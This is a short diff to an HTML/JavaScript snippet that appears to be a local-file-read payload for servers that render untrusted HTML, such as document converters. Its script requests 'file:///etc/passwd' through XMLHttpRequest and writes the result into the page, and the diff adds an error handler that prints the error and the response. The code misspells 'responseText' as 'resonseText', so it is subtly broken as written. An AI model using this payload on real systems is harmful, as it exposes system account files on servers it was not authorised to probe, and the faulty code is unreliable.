@@ -6,6 +6,10 @@
       x.onload=function(){
         document.write(this.resonseText);
       };
+      x.onerror=function(err){
+        document.write(err);
+        document.write(this.resonseText);
+      };
       x.open("GET","file:///etc/passwd");
       x.send();
     </script>
